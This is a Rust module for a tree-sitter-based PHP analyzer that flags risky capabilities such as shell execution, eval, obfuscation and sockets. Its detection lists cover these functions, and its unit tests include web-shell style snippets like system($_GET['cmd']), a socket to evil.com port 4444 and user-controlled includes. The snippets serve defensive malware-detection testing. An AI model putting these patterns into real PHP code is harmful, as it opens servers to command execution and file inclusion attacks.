use crate::analyzers::Analyzer;
use crate::types::*;
use anyhow::{Context, Result};
use std::cell::RefCell;
use std::fs;
use std::path::Path;
use tree_sitter::Parser;

/// PHP analyzer using tree-sitter
pub struct PhpAnalyzer {
    parser: RefCell<Parser>,
}

impl Default for PhpAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

impl PhpAnalyzer {
    pub fn new() -> Self {
        let mut parser = Parser::new();
        parser
            .set_language(&tree_sitter_php::LANGUAGE_PHP.into())
            .expect("Failed to load PHP grammar");

        Self {
            parser: RefCell::new(parser),
        }
    }

    fn analyze_source(&self, file_path: &Path, content: &str) -> Result<AnalysisReport> {
        let start = std::time::Instant::now();

        let tree = self
            .parser
            .borrow_mut()
            .parse(content, None)
            .context("Failed to parse PHP source")?;

        let root = tree.root_node();

        let target = TargetInfo {
            path: file_path.display().to_string(),
            file_type: "php".to_string(),
            size_bytes: content.len() as u64,
            sha256: self.calculate_sha256(content.as_bytes()),
            architectures: None,
        };

        let mut report = AnalysisReport::new(target);

        report.structure.push(StructuralFeature {
            id: "source/language/php".to_string(),
            description: "PHP source code".to_string(),
            evidence: vec![Evidence {
                method: "parser".to_string(),
                source: "tree-sitter-php".to_string(),
                value: "php".to_string(),
                location: Some("AST".to_string()),
            }],
        });

        self.detect_capabilities(&root, content.as_bytes(), &mut report);
        self.extract_functions(&root, content.as_bytes(), &mut report);

        crate::path_mapper::analyze_and_link_paths(&mut report);
        crate::env_mapper::analyze_and_link_env_vars(&mut report);

        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
        report.metadata.tools_used = vec!["tree-sitter-php".to_string()];

        Ok(report)
    }

    fn detect_capabilities(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = node.walk();
        self.walk_ast(&mut cursor, source, report);
    }

    fn walk_ast(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        loop {
            let node = cursor.node();

            match node.kind() {
                "function_call_expression" => {
                    self.analyze_call(&node, source, report);
                }
                "include_expression"
                | "include_once_expression"
                | "require_expression"
                | "require_once_expression" => {
                    self.analyze_include(&node, source, report);
                }
                "object_creation_expression" => {
                    self.analyze_object_creation(&node, source, report);
                }
                "member_call_expression" => {
                    self.analyze_method_call(&node, source, report);
                }
                _ => {}
            }

            if cursor.goto_first_child() {
                self.walk_ast(cursor, source, report);
                cursor.goto_parent();
            }

            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn analyze_call(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        let Some(func_node) = node.child_by_field_name("function") else {
            return;
        };
        let Ok(func_name) = func_node.utf8_text(source) else {
            return;
        };
        let func_lower = func_name.to_lowercase();
        let text = node.utf8_text(source).unwrap_or("");

        let mut capabilities: Vec<(&str, &str, &str, f32, Criticality)> = Vec::new();

        // Command execution functions
        match func_lower.as_str() {
            "exec" | "shell_exec" | "system" | "passthru" | "popen" | "proc_open" => {
                capabilities.push((
                    "exec/command/shell",
                    "Command execution",
                    func_name,
                    0.95,
                    Criticality::Suspicious,
                ));
            }
            "pcntl_exec" => {
                capabilities.push((
                    "exec/command/direct",
                    "Direct process execution",
                    func_name,
                    0.95,
                    Criticality::Suspicious,
                ));
            }
            _ => {}
        }

        // Code execution
        if func_lower == "eval" {
            capabilities.push((
                "exec/script/eval",
                "Dynamic code execution",
                func_name,
                0.95,
                Criticality::Suspicious,
            ));
        }
        if func_lower == "assert" && text.contains('$') {
            capabilities.push((
                "exec/script/eval",
                "Assert with variable (potential code exec)",
                func_name,
                0.85,
                Criticality::Notable,
            ));
        }
        if func_lower == "create_function" {
            capabilities.push((
                "exec/script/eval",
                "Dynamic function creation",
                func_name,
                0.9,
                Criticality::Suspicious,
            ));
        }
        if func_lower == "call_user_func" || func_lower == "call_user_func_array" {
            capabilities.push((
                "exec/dynamic-call",
                "Dynamic function call",
                func_name,
                0.8,
                Criticality::Notable,
            ));
        }

        // Obfuscation patterns
        if func_lower == "base64_decode" {
            capabilities.push((
                "anti-analysis/obfuscation/base64",
                "Base64 decoding",
                func_name,
                0.7,
                Criticality::Notable,
            ));
        }
        if func_lower == "gzinflate" || func_lower == "gzuncompress" || func_lower == "gzdecode" {
            capabilities.push((
                "anti-analysis/obfuscation/compression",
                "Compressed data decoding",
                func_name,
                0.75,
                Criticality::Notable,
            ));
        }
        if func_lower == "str_rot13" {
            capabilities.push((
                "anti-analysis/obfuscation/rot13",
                "ROT13 encoding",
                func_name,
                0.7,
                Criticality::Notable,
            ));
        }
        if func_lower == "chr" || func_lower == "ord" {
            capabilities.push((
                "anti-analysis/obfuscation/char-encoding",
                "Character code manipulation",
                func_name,
                0.5,
                Criticality::Inert,
            ));
        }

        // Deserialization
        if func_lower == "unserialize" {
            capabilities.push((
                "anti-analysis/deserialization",
                "PHP object deserialization",
                func_name,
                0.9,
                Criticality::Suspicious,
            ));
        }

        // File operations
        match func_lower.as_str() {
            "file_get_contents" | "fopen" | "fread" | "readfile" | "file" => {
                capabilities.push((
                    "fs/read",
                    "File read operation",
                    func_name,
                    0.8,
                    Criticality::Notable,
                ));
            }
            "file_put_contents" | "fwrite" | "fputs" => {
                capabilities.push((
                    "fs/write",
                    "File write operation",
                    func_name,
                    0.85,
                    Criticality::Notable,
                ));
            }
            "unlink" | "rmdir" => {
                capabilities.push((
                    "fs/delete",
                    "File/directory deletion",
                    func_name,
                    0.85,
                    Criticality::Notable,
                ));
            }
            "chmod" | "chown" | "chgrp" => {
                capabilities.push((
                    "fs/permissions",
                    "File permission change",
                    func_name,
                    0.85,
                    Criticality::Notable,
                ));
            }
            "copy" | "rename" | "move_uploaded_file" => {
                capabilities.push((
                    "fs/modify",
                    "File modification",
                    func_name,
                    0.8,
                    Criticality::Notable,
                ));
            }
            _ => {}
        }

        // Network operations
        match func_lower.as_str() {
            "curl_init" | "curl_exec" => {
                capabilities.push((
                    "net/http/client",
                    "HTTP client (cURL)",
                    func_name,
                    0.85,
                    Criticality::Notable,
                ));
            }
            "fsockopen" | "pfsockopen" | "socket_create" => {
                capabilities.push((
                    "net/socket/create",
                    "Socket creation",
                    func_name,
                    0.85,
                    Criticality::Suspicious,
                ));
            }
            "stream_socket_client" | "stream_socket_server" => {
                capabilities.push((
                    "net/socket/stream",
                    "Stream socket operation",
                    func_name,
                    0.85,
                    Criticality::Suspicious,
                ));
            }
            "gethostbyname" | "dns_get_record" => {
                capabilities.push((
                    "net/dns/resolve",
                    "DNS lookup",
                    func_name,
                    0.8,
                    Criticality::Inert,
                ));
            }
            _ => {}
        }

        // Database operations
        match func_lower.as_str() {
            "mysqli_query" | "mysql_query" | "pg_query" => {
                capabilities.push((
                    "database/query",
                    "Database query",
                    func_name,
                    0.8,
                    Criticality::Notable,
                ));
            }
            "mysqli_connect" | "mysql_connect" | "pg_connect" => {
                capabilities.push((
                    "database/connect",
                    "Database connection",
                    func_name,
                    0.8,
                    Criticality::Notable,
                ));
            }
            _ => {}
        }

        // Mail
        if func_lower == "mail" {
            capabilities.push((
                "net/email/send",
                "Email sending",
                func_name,
                0.85,
                Criticality::Notable,
            ));
        }

        // Cryptography
        match func_lower.as_str() {
            "openssl_encrypt" | "openssl_decrypt" | "mcrypt_encrypt" | "mcrypt_decrypt" => {
                capabilities.push((
                    "crypto/encrypt",
                    "Encryption operation",
                    func_name,
                    0.8,
                    Criticality::Notable,
                ));
            }
            "md5" | "sha1" | "hash" => {
                capabilities.push((
                    "crypto/hash",
                    "Hashing operation",
                    func_name,
                    0.7,
                    Criticality::Inert,
                ));
            }
            _ => {}
        }

        // Environment/system info
        match func_lower.as_str() {
            "getenv" | "putenv" => {
                capabilities.push((
                    "env/access",
                    "Environment variable access",
                    func_name,
                    0.7,
                    Criticality::Inert,
                ));
            }
            "phpinfo" => {
                capabilities.push((
                    "discovery/system-info",
                    "System information disclosure",
                    func_name,
                    0.85,
                    Criticality::Notable,
                ));
            }
            "php_uname" | "posix_uname" => {
                capabilities.push((
                    "discovery/system-info",
                    "OS information gathering",
                    func_name,
                    0.8,
                    Criticality::Notable,
                ));
            }
            "ini_set" | "ini_get" => {
                capabilities.push((
                    "config/php-ini",
                    "PHP configuration manipulation",
                    func_name,
                    0.75,
                    Criticality::Notable,
                ));
            }
            _ => {}
        }

        // Reflection
        if func_lower == "get_defined_functions"
            || func_lower == "get_defined_vars"
            || func_lower == "get_defined_constants"
        {
            capabilities.push((
                "anti-analysis/reflection",
                "Runtime introspection",
                func_name,
                0.7,
                Criticality::Notable,
            ));
        }

        // preg_replace with /e modifier (PHP < 7.0)
        if func_lower == "preg_replace" && text.contains("/e") {
            capabilities.push((
                "exec/script/eval",
                "preg_replace with /e modifier (code execution)",
                func_name,
                0.95,
                Criticality::Hostile,
            ));
        }

        for (cap_id, desc, method, conf, criticality) in capabilities {
            report.capabilities.push(Capability {
                id: cap_id.to_string(),
                description: desc.to_string(),
                confidence: conf,
                criticality,
                mbc: None,
                attack: None,
                evidence: vec![Evidence {
                    method: "ast".to_string(),
                    source: "tree-sitter-php".to_string(),
                    value: method.to_string(),
                    location: Some(format!(
                        "{}:{}",
                        node.start_position().row + 1,
                        node.start_position().column
                    )),
                }],
                traits: Vec::new(),
                referenced_paths: None,
                referenced_directories: None,
            });
        }
    }

    fn analyze_include(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let text = node.utf8_text(source).unwrap_or("");
        let kind = node.kind();

        let mut criticality = Criticality::Notable;
        let mut confidence = 0.7_f32;

        // Check for dynamic includes (more dangerous)
        if text.contains("$_GET")
            || text.contains("$_POST")
            || text.contains("$_REQUEST")
            || text.contains("$_COOKIE")
        {
            criticality = Criticality::Hostile;
            confidence = 0.95;
        } else if text.contains('$') {
            criticality = Criticality::Suspicious;
            confidence = 0.85;
        }

        let include_type = match kind {
            "include_expression" => "include",
            "include_once_expression" => "include_once",
            "require_expression" => "require",
            "require_once_expression" => "require_once",
            _ => "include",
        };

        report.capabilities.push(Capability {
            id: "fs/include".to_string(),
            description: format!("File inclusion ({})", include_type),
            confidence,
            criticality,
            mbc: None,
            attack: None,
            evidence: vec![Evidence {
                method: "ast".to_string(),
                source: "tree-sitter-php".to_string(),
                value: include_type.to_string(),
                location: Some(format!(
                    "{}:{}",
                    node.start_position().row + 1,
                    node.start_position().column
                )),
            }],
            traits: Vec::new(),
            referenced_paths: None,
            referenced_directories: None,
        });
    }

    fn analyze_object_creation(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let text = node.utf8_text(source).unwrap_or("");
        let mut capabilities: Vec<(&str, &str, &str, f32, Criticality)> = Vec::new();

        if text.contains("PDO") {
            capabilities.push((
                "database/pdo",
                "PDO database connection",
                "PDO",
                0.8,
                Criticality::Notable,
            ));
        }
        if text.contains("mysqli") {
            capabilities.push((
                "database/mysqli",
                "MySQLi database connection",
                "mysqli",
                0.8,
                Criticality::Notable,
            ));
        }
        if text.contains("ReflectionClass") || text.contains("ReflectionMethod") {
            capabilities.push((
                "anti-analysis/reflection",
                "PHP reflection",
                "Reflection",
                0.8,
                Criticality::Notable,
            ));
        }
        if text.contains("SoapClient") {
            capabilities.push((
                "net/soap/client",
                "SOAP client",
                "SoapClient",
                0.8,
                Criticality::Notable,
            ));
        }
        if text.contains("ZipArchive") {
            capabilities.push((
                "archive/zip",
                "ZIP archive manipulation",
                "ZipArchive",
                0.75,
                Criticality::Inert,
            ));
        }

        for (cap_id, desc, method, conf, criticality) in capabilities {
            report.capabilities.push(Capability {
                id: cap_id.to_string(),
                description: desc.to_string(),
                confidence: conf,
                criticality,
                mbc: None,
                attack: None,
                evidence: vec![Evidence {
                    method: "ast".to_string(),
                    source: "tree-sitter-php".to_string(),
                    value: method.to_string(),
                    location: Some(format!(
                        "{}:{}",
                        node.start_position().row + 1,
                        node.start_position().column
                    )),
                }],
                traits: Vec::new(),
                referenced_paths: None,
                referenced_directories: None,
            });
        }
    }

    fn analyze_method_call(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let text = node.utf8_text(source).unwrap_or("");

        // PDO prepared statements
        if text.contains("->prepare(") || text.contains("->execute(") {
            report.capabilities.push(Capability {
                id: "database/query".to_string(),
                description: "Database prepared statement".to_string(),
                confidence: 0.8,
                criticality: Criticality::Notable,
                mbc: None,
                attack: None,
                evidence: vec![Evidence {
                    method: "ast".to_string(),
                    source: "tree-sitter-php".to_string(),
                    value: "PDO::prepare".to_string(),
                    location: Some(format!(
                        "{}:{}",
                        node.start_position().row + 1,
                        node.start_position().column
                    )),
                }],
                traits: Vec::new(),
                referenced_paths: None,
                referenced_directories: None,
            });
        }
    }

    fn extract_functions(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = node.walk();
        self.walk_for_functions(&mut cursor, source, report);
    }

    fn walk_for_functions(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        loop {
            let node = cursor.node();

            if node.kind() == "function_definition" || node.kind() == "method_declaration" {
                let name = self
                    .extract_function_name(&node, source)
                    .unwrap_or_else(|| "anonymous".to_string());

                report.functions.push(Function {
                    name,
                    offset: Some(format!("0x{:x}", node.start_byte())),
                    size: Some((node.end_byte() - node.start_byte()) as u64),
                    complexity: None,
                    calls: Vec::new(),
                    source: "tree-sitter-php".to_string(),
                    control_flow: None,
                    instruction_analysis: None,
                    register_usage: None,
                    constants: Vec::new(),
                    properties: None,
                    signature: None,
                    nesting: None,
                    call_patterns: None,
                });
            }

            if cursor.goto_first_child() {
                self.walk_for_functions(cursor, source, report);
                cursor.goto_parent();
            }

            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn extract_function_name(&self, node: &tree_sitter::Node, source: &[u8]) -> Option<String> {
        let mut cursor = node.walk();
        if cursor.goto_first_child() {
            loop {
                let child = cursor.node();
                if child.kind() == "name" {
                    return child.utf8_text(source).ok().map(|s| s.to_string());
                }
                if !cursor.goto_next_sibling() {
                    break;
                }
            }
        }
        None
    }

    fn calculate_sha256(&self, data: &[u8]) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(data);
        format!("{:x}", hasher.finalize())
    }
}

impl Analyzer for PhpAnalyzer {
    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
        let content = fs::read_to_string(file_path)?;
        self.analyze_source(file_path, &content)
    }

    fn can_analyze(&self, file_path: &Path) -> bool {
        file_path.extension().and_then(|e| e.to_str()) == Some("php")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn analyze_php_code(code: &str) -> AnalysisReport {
        let analyzer = PhpAnalyzer::new();
        let path = PathBuf::from("test.php");
        analyzer.analyze_source(&path, code).unwrap()
    }

    #[test]
    fn test_structural_feature() {
        let code = r#"<?php echo "Hello"; ?>"#;
        let report = analyze_php_code(code);
        assert!(report
            .structure
            .iter()
            .any(|s| s.id == "source/language/php"));
    }

    #[test]
    fn test_detect_exec() {
        let code = r#"<?php exec("whoami"); ?>"#;
        let report = analyze_php_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_shell_exec() {
        let code = r#"<?php $out = shell_exec("ls -la"); ?>"#;
        let report = analyze_php_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_system() {
        let code = r#"<?php system($_GET['cmd']); ?>"#;
        let report = analyze_php_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_eval() {
        let code = r#"<?php eval($code); ?>"#;
        let report = analyze_php_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "exec/script/eval"));
    }

    #[test]
    fn test_detect_base64_decode() {
        let code = r#"<?php $x = base64_decode($encoded); ?>"#;
        let report = analyze_php_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "anti-analysis/obfuscation/base64"));
    }

    #[test]
    fn test_detect_unserialize() {
        let code = r#"<?php $obj = unserialize($data); ?>"#;
        let report = analyze_php_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "anti-analysis/deserialization"));
    }

    #[test]
    fn test_detect_file_operations() {
        let code = r#"<?php
            $content = file_get_contents("config.php");
            file_put_contents("shell.php", $payload);
        ?>"#;
        let report = analyze_php_code(code);
        assert!(report.capabilities.iter().any(|c| c.id == "fs/read"));
        assert!(report.capabilities.iter().any(|c| c.id == "fs/write"));
    }

    #[test]
    fn test_detect_curl() {
        let code = r#"<?php
            $ch = curl_init("http://evil.com");
            curl_exec($ch);
        ?>"#;
        let report = analyze_php_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "net/http/client"));
    }

    #[test]
    fn test_detect_socket() {
        let code = r#"<?php $sock = fsockopen("evil.com", 4444); ?>"#;
        let report = analyze_php_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "net/socket/create"));
    }

    #[test]
    fn test_detect_include() {
        let code = r#"<?php include("config.php"); ?>"#;
        let report = analyze_php_code(code);
        assert!(report.capabilities.iter().any(|c| c.id == "fs/include"));
    }

    #[test]
    fn test_detect_dynamic_include_hostile() {
        let code = r#"<?php include($_GET['page']); ?>"#;
        let report = analyze_php_code(code);
        let cap = report
            .capabilities
            .iter()
            .find(|c| c.id == "fs/include")
            .unwrap();
        assert_eq!(cap.criticality, Criticality::Hostile);
    }

    #[test]
    fn test_detect_pdo() {
        let code = r#"<?php $pdo = new PDO("mysql:host=localhost", "user", "pass"); ?>"#;
        let report = analyze_php_code(code);
        assert!(report.capabilities.iter().any(|c| c.id == "database/pdo"));
    }

    #[test]
    fn test_detect_mail() {
        let code = r#"<?php mail("admin@example.com", "Subject", "Body"); ?>"#;
        let report = analyze_php_code(code);
        assert!(report.capabilities.iter().any(|c| c.id == "net/email/send"));
    }

    #[test]
    fn test_extract_functions() {
        let code = r#"<?php
            function hello($name) {
                return "Hello, " . $name;
            }
            function goodbye() {
                echo "Bye";
            }
        ?>"#;
        let report = analyze_php_code(code);
        assert_eq!(report.functions.len(), 2);
        assert!(report.functions.iter().any(|f| f.name == "hello"));
        assert!(report.functions.iter().any(|f| f.name == "goodbye"));
    }
}
